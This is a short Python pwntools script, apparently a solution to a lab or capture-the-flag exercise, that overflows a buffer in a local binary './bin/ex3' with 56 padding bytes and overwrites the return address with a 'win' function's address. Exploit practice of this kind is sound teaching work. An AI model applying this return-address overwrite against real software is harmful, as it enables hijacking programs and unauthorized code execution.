#!/usr/bin/env python3

from pwn import *

target = process("./bin/ex3")

win_address = 0x401136 # win function address from objdump -f -d ./bin/ex3

payload = b"F" * 56 + p64(win_address, "little")# craft the payload

target.send(payload)

target.interactive()
